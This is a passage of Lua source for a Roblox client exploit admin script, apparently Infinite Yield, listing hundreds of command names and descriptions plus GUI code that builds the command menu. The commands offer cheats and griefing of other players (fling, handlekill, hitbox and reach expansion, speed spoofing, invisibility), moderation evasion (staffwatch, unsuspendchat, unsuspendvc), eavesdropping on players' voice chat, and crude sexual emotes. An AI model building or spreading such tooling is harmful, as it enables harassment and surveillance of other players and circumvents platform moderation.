		CMDs[#CMDs + 1] = {NAME = 'notifyfreecamposition / notifyfcpos', DESC = 'Noitifies you your freecam coordinates'}
		CMDs[#CMDs + 1] = {NAME = 'copyfreecamposition / copyfcpos', DESC = 'Copies your freecam coordinates to your clipboard'}
		CMDs[#CMDs + 1] = {NAME = 'gotocamera / gotocam', DESC = 'Teleports you to the location of your camera'}
		CMDs[#CMDs + 1] = {NAME = 'tweengotocam / tgotocam', DESC = 'Tweens you to the location of your camera'}
		CMDs[#CMDs + 1] = {NAME = 'firstp', DESC = 'Forces camera to go into first person'}
		CMDs[#CMDs + 1] = {NAME = 'thirdp', DESC = 'Allows camera to go into third person'}
		CMDs[#CMDs + 1] = {NAME = 'noclipcam / nccam', DESC = 'Allows camera to go through objects like walls'}
		CMDs[#CMDs + 1] = {NAME = 'maxzoom [num]', DESC = 'Maximum camera zoom'}
		CMDs[#CMDs + 1] = {NAME = 'minzoom [num]', DESC = 'Minimum camera zoom'}
		CMDs[#CMDs + 1] = {NAME = 'camdistance [num]', DESC = 'Changes camera distance from your player'}
		CMDs[#CMDs + 1] = {NAME = 'fov [num]', DESC = 'Adjusts field of view (default is 70)'}
		CMDs[#CMDs + 1] = {NAME = 'fixcam / restorecam', DESC = 'Fixes camera'}
		CMDs[#CMDs + 1] = {NAME = 'enableshiftlock / enablesl', DESC = 'Enables the shift lock option'}
		CMDs[#CMDs + 1] = {NAME = 'lookat [player]', DESC = 'Moves your camera view to a player'}
		CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
		CMDs[#CMDs + 1] = {NAME = 'btools (CLIENT)', DESC = 'Gives you building tools (DOES NOT REPLICATE)'}
		CMDs[#CMDs + 1] = {NAME = 'f3x (CLIENT)', DESC = 'Gives you F3X building tools (DOES NOT REPLICATE)'}
		CMDs[#CMDs + 1] = {NAME = 'partname / partpath', DESC = 'Allows you to click a part to see its path & name'}
		CMDs[#CMDs + 1] = {NAME = 'delete [instance name] (CLIENT)', DESC = 'Removes any part with a certain name from the workspace (DOES NOT REPLICATE)'}
		CMDs[#CMDs + 1] = {NAME = 'deleteclass / dc [class name] (CLIENT)', DESC = 'Removes any part with a certain classname from the workspace (DOES NOT REPLICATE)'}
		CMDs[#CMDs + 1] = {NAME = 'lockworkspace / lockws', DESC = 'Locks the whole workspace'}
		CMDs[#CMDs + 1] = {NAME = 'unlockworkspace / unlockws', DESC = 'Unlocks the whole workspace'}
		CMDs[#CMDs + 1] = {NAME = 'invisibleparts / invisparts (CLIENT)', DESC = 'Shows invisible parts'}
		CMDs[#CMDs + 1] = {NAME = 'uninvisibleparts / uninvisparts (CLIENT)', DESC = 'Makes parts affected by invisparts return to normal'}
		CMDs[#CMDs + 1] = {NAME = 'deleteinvisparts / dip (CLIENT)', DESC = 'Deletes invisible parts'}
		CMDs[#CMDs + 1] = {NAME = 'gotopart [part name]', DESC = 'Moves your character to a part or multiple parts'}
		CMDs[#CMDs + 1] = {NAME = 'tweengotopart / tgotopart [part name]', DESC = 'Tweens your character to a part or multiple parts'}
		CMDs[#CMDs + 1] = {NAME = 'gotopartclass / gpc [class name]', DESC = 'Moves your character to a part or multiple parts based on classname'}
		CMDs[#CMDs + 1] = {NAME = 'tweengotopartclass / tgpc [class name]', DESC = 'Tweens your character to a part or multiple parts based on classname'}
		CMDs[#CMDs + 1] = {NAME = 'gotomodel [part name]', DESC = 'Moves your character to a model or multiple models'}
		CMDs[#CMDs + 1] = {NAME = 'tweengotomodel / tgotomodel [part name]', DESC = 'Tweens your character to a model or multiple models'}
		CMDs[#CMDs + 1] = {NAME = 'gotopartdelay / gotomodeldelay [num]', DESC = 'Adjusts how quickly you teleport to each part (default is 0.1)'}
		CMDs[#CMDs + 1] = {NAME = 'bringpart [part name] (CLIENT)', DESC = 'Moves a part or multiple parts to your character'}
		CMDs[#CMDs + 1] = {NAME = 'bringpartclass / bpc [class name] (CLIENT)', DESC = 'Moves a part or multiple parts to your character based on classname'}
		CMDs[#CMDs + 1] = {NAME = 'noclickdetectorlimits / nocdlimits', DESC = 'Sets all click detectors MaxActivationDistance to math.huge'}
		CMDs[#CMDs + 1] = {NAME = 'fireclickdetectors / firecd [name]', DESC = 'Uses all click detectors in a game or uses the optional name'}
		CMDs[#CMDs + 1] = {NAME = 'firetouchinterests / touchinterests [name]', DESC = 'Uses all touchinterests in a game or uses the optional name'}
		CMDs[#CMDs + 1] = {NAME = 'noproximitypromptlimits / nopplimits', DESC = 'Sets all proximity prompts MaxActivationDistance to math.huge'}
		CMDs[#CMDs + 1] = {NAME = 'fireproximityprompts / firepp [name]', DESC = 'Uses all proximity prompts in a game or uses the optional name'}
		CMDs[#CMDs + 1] = {NAME = 'instantproximityprompts / instantpp', DESC = 'Disable the cooldown for proximity prompts'}
		CMDs[#CMDs + 1] = {NAME = 'uninstantproximityprompts / uninstantpp', DESC = 'Undo the cooldown removal'}
		CMDs[#CMDs + 1] = {NAME = 'tpunanchored / tpua [player]', DESC = 'Teleports unanchored parts to a player'}
		CMDs[#CMDs + 1] = {NAME = 'animsunanchored / freezeua', DESC = 'Freezes unanchored parts'}
		CMDs[#CMDs + 1] = {NAME = 'thawunanchored / thawua / unfreezeua', DESC = 'Thaws unanchored parts'}
		CMDs[#CMDs + 1] = {NAME = 'removeterrain / rterrain / noterrain', DESC = 'Removes all terrain'}
		CMDs[#CMDs + 1] = {NAME = 'clearnilinstances / nonilinstances / cni', DESC = 'Removes nil instances'}
		CMDs[#CMDs + 1] = {NAME = 'destroyheight / dh [num]', DESC = 'Sets FallenPartsDestroyHeight'}
		CMDs[#CMDs + 1] = {NAME = 'fakeout', DESC = 'Tp to the void and then back (useful to kill people attached to you)'}
		CMDs[#CMDs + 1] = {NAME = 'antivoid', DESC = 'Prevents you from falling into the void by launching you upwards'}
		CMDs[#CMDs + 1] = {NAME = 'unantivoid / noantivoid', DESC = 'Disables antivoid'}
		CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
		CMDs[#CMDs + 1] = {NAME = 'fullbright / fb (CLIENT)', DESC = 'Makes the map brighter / more visible'}
		CMDs[#CMDs + 1] = {NAME = 'loopfullbright / loopfb (CLIENT)', DESC = 'Makes the map brighter / more visible but looped'}
		CMDs[#CMDs + 1] = {NAME = 'unloopfullbright / unloopfb', DESC = 'Unloops fullbright'}
		CMDs[#CMDs + 1] = {NAME = 'ambient [num] [num] [num] (CLIENT)', DESC = 'Changes ambient'}
		CMDs[#CMDs + 1] = {NAME = 'day (CLIENT)', DESC = 'Changes the time to day for the client'}
		CMDs[#CMDs + 1] = {NAME = 'night (CLIENT)', DESC = 'Changes the time to night for the client'}
		CMDs[#CMDs + 1] = {NAME = 'nofog (CLIENT)', DESC = 'Removes fog'}
		CMDs[#CMDs + 1] = {NAME = 'brightness [num] (CLIENT)', DESC = 'Changes the brightness lighting property'}
		CMDs[#CMDs + 1] = {NAME = 'globalshadows / gshadows (CLIENT)', DESC = 'Enables global shadows'}
		CMDs[#CMDs + 1] = {NAME = 'noglobalshadows / nogshadows (CLIENT)', DESC = 'Disables global shadows'}
		CMDs[#CMDs + 1] = {NAME = 'restorelighting / rlighting', DESC = 'Restores Lighting properties'}
		CMDs[#CMDs + 1] = {NAME = 'light [radius] [brightness] (CLIENT)', DESC = 'Gives your player dynamic light'}
		CMDs[#CMDs + 1] = {NAME = 'nolight / unlight', DESC = 'Removes dynamic light from your player'}
		CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
		CMDs[#CMDs + 1] = {NAME = 'inspect / examine [player]', DESC = 'Opens InspectMenu for a certain player'}
		CMDs[#CMDs + 1] = {NAME = 'age [player]', DESC = 'Tells you the age of a player'}
		CMDs[#CMDs + 1] = {NAME = 'chatage [player]', DESC = 'Chats the age of a player'}
		CMDs[#CMDs + 1] = {NAME = 'joindate / jd [player]', DESC = 'Tells you the date the player joined Roblox'}
		CMDs[#CMDs + 1] = {NAME = 'chatjoindate / cjd [player]', DESC = 'Chats the date the player joined Roblox'}
		CMDs[#CMDs + 1] = {NAME = 'copyname / copyuser [player]', DESC = 'Copies a players full username to your clipboard'}
		CMDs[#CMDs + 1] = {NAME = 'userid / id [player]', DESC = 'Notifies a players user ID'}
		CMDs[#CMDs + 1] = {NAME = 'copyplaceid / placeid', DESC = 'Copies the current place id to your clipboard'}
		CMDs[#CMDs + 1] = {NAME = 'copygameid / gameid', DESC = 'Copies the current game id to your clipboard'}
		CMDs[#CMDs + 1] = {NAME = 'copyuserid / copyid [player]', DESC = 'Copies a players user ID to your clipboard'}
		CMDs[#CMDs + 1] = {NAME = 'appearanceid / aid [player]', DESC = 'Notifies a players appearance ID'}
		CMDs[#CMDs + 1] = {NAME = 'copyappearanceid / caid [player]', DESC = 'Copies a players appearance ID to your clipboard'}
		CMDs[#CMDs + 1] = {NAME = 'bang [player] [speed]', DESC = 'owo'}
		CMDs[#CMDs + 1] = {NAME = 'unbang', DESC = 'uwu'}
		CMDs[#CMDs + 1] = {NAME = 'carpet [player]', DESC = 'Be someones carpet'}
		CMDs[#CMDs + 1] = {NAME = 'uncarpet', DESC = 'Undoes carpet'}
		CMDs[#CMDs + 1] = {NAME = 'friend [player]', DESC = 'Sends a friend request to certain players'}
		CMDs[#CMDs + 1] = {NAME = 'unfriend [player]', DESC = 'Unfriends certain players'}
		CMDs[#CMDs + 1] = {NAME = 'headsit [player]', DESC = 'Sit on a players head'}
		CMDs[#CMDs + 1] = {NAME = 'walkto / follow [player]', DESC = 'Follow a player'}
		CMDs[#CMDs + 1] = {NAME = 'pathfindwalkto / pathfindfollow [player]', DESC = 'Follow a player using pathfinding'}
		CMDs[#CMDs + 1] = {NAME = 'pathfindwalktowaypoint / pathfindwalktowp [waypoint]', DESC = 'Walk to a waypoint using pathfinding'}
		CMDs[#CMDs + 1] = {NAME = 'unwalkto / unfollow', DESC = 'Stops following a player'}
		CMDs[#CMDs + 1] = {NAME = 'orbit [player] [speed] [distance]', DESC = 'Makes your character orbit around a player with an optional speed and an optional distance'}
		CMDs[#CMDs + 1] = {NAME = 'unorbit', DESC = 'Disables orbit'}
		CMDs[#CMDs + 1] = {NAME = 'stareat / stare [player]', DESC = 'Stare / look at a player'}
		CMDs[#CMDs + 1] = {NAME = 'unstareat / unstare [player]', DESC = 'Disables stareat'}
		CMDs[#CMDs + 1] = {NAME = 'rolewatch [group id] [role name]', DESC = 'Notify if someone from a watched group joins the server'}
		CMDs[#CMDs + 1] = {NAME = 'rolewatchstop / unrolewatch', DESC = 'Disable Rolewatch'}
		CMDs[#CMDs + 1] = {NAME = 'rolewatchleave', DESC = 'Toggle if you should leave the game if someone from a watched group joins the server'}
		CMDs[#CMDs + 1] = {NAME = 'staffwatch', DESC = 'Notify if a staff member of the game joins the server'}
		CMDs[#CMDs + 1] = {NAME = 'unstaffwatch', DESC = 'Disable Staffwatch'}
		CMDs[#CMDs + 1] = {NAME = 'handlekill / hkill [player] [radius] (TOOL)', DESC = 'Kills a player using tool damage (YOU NEED A TOOL)'}
		CMDs[#CMDs + 1] = {NAME = 'fling', DESC = 'Flings anyone you touch'}
		CMDs[#CMDs + 1] = {NAME = 'unfling', DESC = 'Disables the fling command'}
		CMDs[#CMDs + 1] = {NAME = 'flyfling [speed]', DESC = 'Basically the invisfling command but not invisible'}
		CMDs[#CMDs + 1] = {NAME = 'unflyfling', DESC = 'Disables the flyfling command'}
		CMDs[#CMDs + 1] = {NAME = 'walkfling', DESC = 'Basically fling but no spinning'}
		CMDs[#CMDs + 1] = {NAME = 'unwalkfling / nowalkfling', DESC = 'Disables walkfling'}
		CMDs[#CMDs + 1] = {NAME = 'invisfling', DESC = 'Enables invisible fling (the invis part is patched, try using the god command before using this)'}
		CMDs[#CMDs + 1] = {NAME = 'antifling', DESC = 'Disables player collisions to prevent you from being flung'}
		CMDs[#CMDs + 1] = {NAME = 'unantifling', DESC = 'Disables antifling'}
		CMDs[#CMDs + 1] = {NAME = 'loopoof', DESC = 'Loops everyones character sounds (everyone can hear)'}
		CMDs[#CMDs + 1] = {NAME = 'unloopoof', DESC = 'Stops the oof chaos'}
		CMDs[#CMDs + 1] = {NAME = 'muteboombox [player]', DESC = 'Mutes someones boombox'}
		CMDs[#CMDs + 1] = {NAME = 'unmuteboombox [player]', DESC = 'Unmutes someones boombox'}
		CMDs[#CMDs + 1] = {NAME = 'hitbox [player] [size] [transparency]', DESC = 'Expands the hitbox for players HumanoidRootPart (default is 1)'}
		CMDs[#CMDs + 1] = {NAME = 'headsize [player] [size]', DESC = 'Expands the head size for players Head (default is 1)'}
		CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
		CMDs[#CMDs + 1] = {NAME = 'reset', DESC = 'Resets your character normally'}
		CMDs[#CMDs + 1] = {NAME = 'respawn', DESC = 'Respawns you'}
		CMDs[#CMDs + 1] = {NAME = 'refresh / re', DESC = 'Respawns and brings you back to the same position'}
		CMDs[#CMDs + 1] = {NAME = 'god', DESC = 'Makes your character difficult to kill in most games'}
		CMDs[#CMDs + 1] = {NAME = 'permadeath', DESC = 'Makes you unable to respawn after death'}
		CMDs[#CMDs + 1] = {NAME = 'invisible / invis', DESC = 'Makes you invisible to other players'}
		CMDs[#CMDs + 1] = {NAME = 'visible / vis', DESC = 'Makes you visible to other players'}
		CMDs[#CMDs + 1] = {NAME = 'toolinvisible / toolinvis / tinvis', DESC = 'Makes you invisible to other players and able to use tools'}
		CMDs[#CMDs + 1] = {NAME = 'speed / ws / walkspeed [num]', DESC = 'Change your walkspeed (default is 16)'}
		CMDs[#CMDs + 1] = {NAME = 'spoofspeed / spoofws [num]', DESC = 'Spoofs your WalkSpeed on the Client'}
		CMDs[#CMDs + 1] = {NAME = 'loopspeed / loopws [num]', DESC = 'Loops your walkspeed'}
		CMDs[#CMDs + 1] = {NAME = 'unloopspeed / unloopws', DESC = 'Turns off loopspeed'}
		CMDs[#CMDs + 1] = {NAME = 'hipheight / hheight [num]', DESC = 'Adjusts hip height'}
		CMDs[#CMDs + 1] = {NAME = 'jumppower / jpower / jp [num]', DESC = 'Change a players jump height (default is 50)'}
		CMDs[#CMDs + 1] = {NAME = 'spoofjumppower / spoofjp [num]', DESC = 'Spoofs your JumpPower on the Client'}
		CMDs[#CMDs + 1] = {NAME = 'loopjumppower / loopjp [num]', DESC = 'Loops your jump height'}
		CMDs[#CMDs + 1] = {NAME = 'unloopjumppower / unloopjp', DESC = 'Turns off loopjumppower'}
		CMDs[#CMDs + 1] = {NAME = 'maxslopeangle / msa [num]', DESC = 'Adjusts MaxSlopeAngle'}
		CMDs[#CMDs + 1] = {NAME = 'gravity / grav [num] (CLIENT)', DESC = 'Change your gravity'}
		CMDs[#CMDs + 1] = {NAME = 'sit', DESC = 'Makes your character sit'}
		CMDs[#CMDs + 1] = {NAME = 'lay / laydown', DESC = 'Makes your character lay down'}
		CMDs[#CMDs + 1] = {NAME = 'sitwalk', DESC = 'Makes your character sit while still being able to walk'}
		CMDs[#CMDs + 1] = {NAME = 'nosit', DESC = 'Prevents your character from sitting'}
		CMDs[#CMDs + 1] = {NAME = 'unnosit', DESC = 'Disables nosit'}
		CMDs[#CMDs + 1] = {NAME = 'jump', DESC = 'Makes your character jump'}
		CMDs[#CMDs + 1] = {NAME = 'infinitejump / infjump', DESC = 'Allows you to jump before hitting the ground'}
		CMDs[#CMDs + 1] = {NAME = 'uninfinitejump / uninfjump', DESC = 'Disables infjump'}
		CMDs[#CMDs + 1] = {NAME = 'flyjump', DESC = 'Allows you to hold space to fly up'}
		CMDs[#CMDs + 1] = {NAME = 'unflyjump', DESC = 'Disables flyjump'}
		CMDs[#CMDs + 1] = {NAME = 'autojump / ajump', DESC = 'Automatically jumps when you run into an object'}
		CMDs[#CMDs + 1] = {NAME = 'unautojump / unajump', DESC = 'Disables autojump'}
		CMDs[#CMDs + 1] = {NAME = 'edgejump / ejump', DESC = 'Automatically jumps when you get to the edge of an object'}
		CMDs[#CMDs + 1] = {NAME = 'unedgejump / unejump', DESC = 'Disables edgejump'}
		CMDs[#CMDs + 1] = {NAME = 'platformstand / stun', DESC = 'Enables PlatformStand'}
		CMDs[#CMDs + 1] = {NAME = 'unplatformstand / unstun', DESC = 'Disables PlatformStand'}
		CMDs[#CMDs + 1] = {NAME = 'norotate / noautorotate', DESC = 'Disables AutoRotate'}
		CMDs[#CMDs + 1] = {NAME = 'unnorotate / autorotate', DESC = 'Enables AutoRotate'}
		CMDs[#CMDs + 1] = {NAME = 'enablestate [StateType]', DESC = 'Enables a humanoid state type'}
		CMDs[#CMDs + 1] = {NAME = 'disablestate [StateType]', DESC = 'Disables a humanoid state type'}
		CMDs[#CMDs + 1] = {NAME = 'team [team name] (CLIENT)', DESC = 'Changes your team. Sometimes fools localscripts.'}
		CMDs[#CMDs + 1] = {NAME = 'nobillboardgui / nobgui / noname', DESC = 'Removes billboard and surface GUIs from your players (i.e. name GUIs at cafes)'}
		CMDs[#CMDs + 1] = {NAME = 'loopnobgui / loopnoname', DESC = 'Loop removes billboard and surface GUIs from your players (i.e. name GUIs at cafes)'}
		CMDs[#CMDs + 1] = {NAME = 'unloopnobgui / unloopnoname', DESC = 'Disables loopnobgui'}
		CMDs[#CMDs + 1] = {NAME = 'noarms', DESC = 'Removes your arms'}
		CMDs[#CMDs + 1] = {NAME = 'nolegs', DESC = 'Removes your legs'}
		CMDs[#CMDs + 1] = {NAME = 'nolimbs', DESC = 'Removes your limbs'}
		CMDs[#CMDs + 1] = {NAME = 'naked (CLIENT)', DESC = 'Removes your clothing'}
		CMDs[#CMDs + 1] = {NAME = 'noface / removeface', DESC = 'Removes your face'}
		CMDs[#CMDs + 1] = {NAME = 'blockhead', DESC = 'Turns your head into a block'}
		CMDs[#CMDs + 1] = {NAME = 'blockhats', DESC = 'Turns your hats into blocks'}
		CMDs[#CMDs + 1] = {NAME = 'blocktool', DESC = 'Turns the currently selected tool into a block'}
		CMDs[#CMDs + 1] = {NAME = 'creeper', DESC = 'Makes you look like a creeper'}
		CMDs[#CMDs + 1] = {NAME = 'drophats', DESC = 'Drops your hats'}
		CMDs[#CMDs + 1] = {NAME = 'nohats / deletehats / rhats', DESC = 'Deletes your hats'}
		CMDs[#CMDs + 1] = {NAME = 'hatspin / spinhats', DESC = 'Spins your characters accessories'}
		CMDs[#CMDs + 1] = {NAME = 'unhatspin / unspinhats', DESC = 'Undoes spinhats'}
		CMDs[#CMDs + 1] = {NAME = 'clearhats / cleanhats', DESC = 'Clears hats in the workspace'}
		CMDs[#CMDs + 1] = {NAME = 'chardelete / cd [instance name]', DESC = 'Removes any part with a certain name from your character'}
		CMDs[#CMDs + 1] = {NAME = 'chardeleteclass / cdc [class name]', DESC = 'Removes any part with a certain classname from your character'}
		CMDs[#CMDs + 1] = {NAME = 'deletevelocity / dv / removeforces', DESC = 'Removes any velocity / force instances in your character'}
		CMDs[#CMDs + 1] = {NAME = 'weaken [num]', DESC = 'Makes your character less dense'}
		CMDs[#CMDs + 1] = {NAME = 'unweaken', DESC = 'Sets your characters CustomPhysicalProperties to default'}
		CMDs[#CMDs + 1] = {NAME = 'strengthen [num]', DESC = 'Makes your character more dense (CustomPhysicalProperties)'}
		CMDs[#CMDs + 1] = {NAME = 'unstrengthen', DESC = 'Sets your characters CustomPhysicalProperties to default'}
		CMDs[#CMDs + 1] = {NAME = 'breakvelocity', DESC = 'Sets your characters velocity to 0'}
		CMDs[#CMDs + 1] = {NAME = 'spin [speed]', DESC = 'Spins your character'}
		CMDs[#CMDs + 1] = {NAME = 'unspin', DESC = 'Disables spin'}
		CMDs[#CMDs + 1] = {NAME = 'split', DESC = 'Splits your character in half'}
		CMDs[#CMDs + 1] = {NAME = 'nilchar', DESC = 'Sets your characters parent to nil'}
		CMDs[#CMDs + 1] = {NAME = 'unnilchar / nonilchar', DESC = 'Sets your characters parent to workspace'}
		CMDs[#CMDs + 1] = {NAME = 'noroot / removeroot / rroot', DESC = 'Removes your characters HumanoidRootPart'}
		CMDs[#CMDs + 1] = {NAME = 'replaceroot', DESC = 'Replaces your characters HumanoidRootPart'}
		CMDs[#CMDs + 1] = {NAME = 'clearcharappearance / clearchar / clrchar', DESC = 'Removes all accessory, shirt, pants, charactermesh, and bodycolors'}
		CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
		CMDs[#CMDs + 1] = {NAME = 'animation / anim [ID] [speed]', DESC = 'Makes your character perform an animation (must be an animation on the marketplace or by roblox/stickmasterluke to replicate)'}
		CMDs[#CMDs + 1] = {NAME = 'emote / em [ID] [speed]', DESC = 'Makes your character perform an emote (must be on the marketplace or by roblox/stickmasterluke to replicate)'}
		CMDs[#CMDs + 1] = {NAME = 'dance', DESC = 'Makes you  d a n c e'}
		CMDs[#CMDs + 1] = {NAME = 'undance', DESC = 'Stops dance animations'}
		CMDs[#CMDs + 1] = {NAME = 'spasm', DESC = 'Makes you  c r a z y'}
		CMDs[#CMDs + 1] = {NAME = 'unspasm', DESC = 'Stops spasm'}
		CMDs[#CMDs + 1] = {NAME = 'headthrow', DESC = 'Simply makes you throw your head'}
		CMDs[#CMDs + 1] = {NAME = 'noanim', DESC = 'Disables your animations'}
		CMDs[#CMDs + 1] = {NAME = 'reanim', DESC = 'Restores your animations'}
		CMDs[#CMDs + 1] = {NAME = 'animspeed [num]', DESC = 'Changes the speed of your current animation'}
		CMDs[#CMDs + 1] = {NAME = 'copyanimation / copyanim / copyemote [player]', DESC = 'Copies someone elses animation'}
		CMDs[#CMDs + 1] = {NAME = 'copyanimationid / copyanimid / copyemoteid [player]', DESC = 'Copies your animation id or someone elses to your clipboard'}
		CMDs[#CMDs + 1] = {NAME = 'loopanimation / loopanim', DESC = 'Loops your current animation'}
		CMDs[#CMDs + 1] = {NAME = 'stopanimations / stopanims', DESC = 'Stops running animations'}
		CMDs[#CMDs + 1] = {NAME = 'refreshanimations / refreshanims', DESC = 'Refreshes animations'}
		CMDs[#CMDs + 1] = {NAME = 'allowcustomanim / allowcustomanimations', DESC = 'Lets you use custom animation packs instead'}
		CMDs[#CMDs + 1] = {NAME = 'unallowcustomanim / unallowcustomanimations', DESC = 'Doesn\'t let you use custom animation packs instead'}
		CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
		CMDs[#CMDs + 1] = {NAME = 'autoclick [click delay] [release delay]', DESC = 'Automatically clicks your mouse with a set delay'}
		CMDs[#CMDs + 1] = {NAME = 'unautoclick / noautoclick', DESC = 'Turns off autoclick'}
		CMDs[#CMDs + 1] = {NAME = 'autokeypress [key] [down delay] [up delay]', DESC = 'Automatically presses a key with a set delay'}
		CMDs[#CMDs + 1] = {NAME = 'unautokeypress', DESC = 'Stops autokeypress'}
		CMDs[#CMDs + 1] = {NAME = 'hovername', DESC = 'Shows a players username when your mouse is hovered over them'}
		CMDs[#CMDs + 1] = {NAME = 'unhovername / nohovername', DESC = 'Turns off hovername'}
		CMDs[#CMDs + 1] = {NAME = 'mousesensitivity / ms [0-10]', DESC = 'Sets your mouse sensitivity (affects first person and right click drag) (default is 1)'}
		CMDs[#CMDs + 1] = {NAME = 'clickdelete', DESC = 'Go to Settings > Keybinds > Add for click delete'}
		CMDs[#CMDs + 1] = {NAME = 'clickteleport', DESC = 'Go to Settings > Keybinds > Add for click teleport'}
		CMDs[#CMDs + 1] = {NAME = 'mouseteleport / mousetp', DESC = 'Teleports your character to your mouse. This is recommended as a keybind'}
		CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
		CMDs[#CMDs + 1] = {NAME = 'tools', DESC = 'Copies tools from ReplicatedStorage and Lighting'}
		CMDs[#CMDs + 1] = {NAME = 'notools / removetools / deletetools', DESC = 'Removes tools from character and backpack'}
		CMDs[#CMDs + 1] = {NAME = 'deleteselectedtool / dst', DESC = 'Removes any currently selected tools'}
		CMDs[#CMDs + 1] = {NAME = 'grabtools', DESC = 'Automatically get tools that are dropped'}
		CMDs[#CMDs + 1] = {NAME = 'ungrabtools / nograbtools', DESC = 'Disables grabtools'}
		CMDs[#CMDs + 1] = {NAME = 'copytools [player] (CLIENT)', DESC = 'Copies a players tools'}
		CMDs[#CMDs + 1] = {NAME = 'dupetools / clonetools [num]', DESC = 'Duplicates your inventory tools a set amount of times'}
		CMDs[#CMDs + 1] = {NAME = 'droptools', DESC = 'Drops your tools'}
		CMDs[#CMDs + 1] = {NAME = 'droppabletools', DESC = 'Makes your tools droppable'}
		CMDs[#CMDs + 1] = {NAME = 'equiptools', DESC = 'Equips every tool in your inventory at once'}
		CMDs[#CMDs + 1] = {NAME = 'unequiptools', DESC = 'Unequips every tool you are currently holding at once'}
		CMDs[#CMDs + 1] = {NAME = 'removespecifictool [name]', DESC = 'Automatically remove a specific tool from your inventory'}
		CMDs[#CMDs + 1] = {NAME = 'unremovespecifictool [name]', DESC = 'Stops removing a specific tool from your inventory'}
		CMDs[#CMDs + 1] = {NAME = 'clearremovespecifictool', DESC = 'Stop removing all specific tools from your inventory'}
		CMDs[#CMDs + 1] = {NAME = 'reach [num]', DESC = 'Increases the hitbox of your held tool'}
		CMDs[#CMDs + 1] = {NAME = 'boxreach [num]', DESC = 'Increases the hitbox of your held tool in a box shape'}
		CMDs[#CMDs + 1] = {NAME = 'unreach / noreach', DESC = 'Turns off reach'}
		CMDs[#CMDs + 1] = {NAME = 'grippos [X Y Z]', DESC = 'Changes your current tools grip position'}
		CMDs[#CMDs + 1] = {NAME = 'usetools [amount] [delay]', DESC = 'Activates all tools in your backpack at the same time'}
		CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
		CMDs[#CMDs + 1] = {NAME = 'addalias [cmd] [alias]', DESC = 'Adds an alias to a command'}
		CMDs[#CMDs + 1] = {NAME = 'removealias [alias]', DESC = 'Removes a custom alias'}
		CMDs[#CMDs + 1] = {NAME = 'clraliases', DESC = 'Removes all custom aliases'}
		CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
		CMDs[#CMDs + 1] = {NAME = 'addplugin / plugin [name]', DESC = 'Add a plugin via command'}
		CMDs[#CMDs + 1] = {NAME = 'removeplugin / deleteplugin [name]', DESC = 'Remove a plugin via command'}
		CMDs[#CMDs + 1] = {NAME = 'reloadplugin [name]', DESC = 'Reloads a plugin'}
		CMDs[#CMDs + 1] = {NAME = 'addallplugins / loadallplugins', DESC = 'Adds all available plugins from the workspace folder'}
		CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
		CMDs[#CMDs + 1] = {NAME = 'breakloops / break (cmd loops)', DESC = 'Stops any cmd loops (;100^1^cmd)'}
		CMDs[#CMDs + 1] = {NAME = 'removecmd / deletecmd', DESC = 'Removes a command until the admin is reloaded'}
		CMDs[#CMDs + 1] = {NAME = 'tpwalk / teleportwalk [num]', DESC = 'Teleports you to your move direction'}
		CMDs[#CMDs + 1] = {NAME = 'untpwalk / unteleportwalk', DESC = 'Undoes tpwalk / teleportwalk'}
		CMDs[#CMDs + 1] = {NAME = 'notifyping / ping', DESC = 'Notify yourself your ping'}
		CMDs[#CMDs + 1] = {NAME = 'trip', DESC = 'Makes your character fall over'}
		CMDs[#CMDs + 1] = {NAME = 'norender', DESC = 'Disable 3d Rendering to decrease the amount of CPU the client uses'}
		CMDs[#CMDs + 1] = {NAME = 'render', DESC = 'Enable 3d Rendering'}
		CMDs[#CMDs + 1] = {NAME = 'use2022materials / 2022materials', DESC = 'Enables 2022 material textures'}
		CMDs[#CMDs + 1] = {NAME = 'unuse2022materials / un2022materials', DESC = 'Disables 2022 material textures'}
		CMDs[#CMDs + 1] = {NAME = 'promptr6', DESC = 'Prompts the game to switch your rig type to R6'}
		CMDs[#CMDs + 1] = {NAME = 'promptr15', DESC = 'Prompts the game to switch your rig type to R15'}
		CMDs[#CMDs + 1] = {NAME = 'wallwalk / walkonwalls', DESC = 'Walk on walls'}
		CMDs[#CMDs + 1] = {NAME = 'removeads / adblock', DESC = 'Automatically removes ad billboards'}
		CMDs[#CMDs + 1] = {NAME = 'scare / spook [player]', DESC = 'Teleports in front of a player for half a second'}
		CMDs[#CMDs + 1] = {NAME = 'alignmentkeys', DESC = 'Enables the left and right alignment keys (comma and period)'}
		CMDs[#CMDs + 1] = {NAME = 'unalignmentkeys / noalignmentkeys', DESC = 'Disables the alignment keys'}
		CMDs[#CMDs + 1] = {NAME = 'ctrllock', DESC = 'Binds Shiftlock to LeftControl'}
		CMDs[#CMDs + 1] = {NAME = 'unctrllock', DESC = 'Re-binds Shiftlock to LeftShift'}
		CMDs[#CMDs + 1] = {NAME = 'listento [player]', DESC = 'Listens to the area around a player. Can also eavesdrop with vc'}
		CMDs[#CMDs + 1] = {NAME = 'unlistento', DESC = 'Disables listento'}
		CMDs[#CMDs + 1] = {NAME = 'jerk', DESC = 'Makes you jork it'}
		CMDs[#CMDs + 1] = {NAME = 'unsuspendchat', DESC = 'Unsuspends you from text chat'}
		CMDs[#CMDs + 1] = {NAME = 'unsuspendvc', DESC = 'Unsuspends you from voice chat'}
		wait()
	
		for i = 1, #CMDs do
			local newcmd = Example:Clone()
			newcmd.Parent = CMDsF
			newcmd.Visible = false
			newcmd.Text = CMDs[i].NAME
			newcmd.Name = "CMD"
			table.insert(text1, newcmd)
			if CMDs[i].DESC ~= "" then
				newcmd:SetAttribute("Title", CMDs[i].NAME)
				newcmd:SetAttribute("Desc", CMDs[i].DESC)
				newcmd.MouseButton1Down:Connect(function()
					if not IsOnMobile and newcmd.Visible and newcmd.TextTransparency == 0 then
						local currentText = Cmdbar.Text
						Cmdbar:CaptureFocus()
						autoComplete(newcmd.Text, currentText)
						maximizeHolder()
					end
				end)
			end
		end
	
		IndexContents("", true)
	
		function checkTT()
			local t
			local guisAtPosition = COREGUI:GetGuiObjectsAtPosition(IYMouse.X, IYMouse.Y)
	
			for _, gui in pairs(guisAtPosition) do
				if gui.Parent == CMDsF then
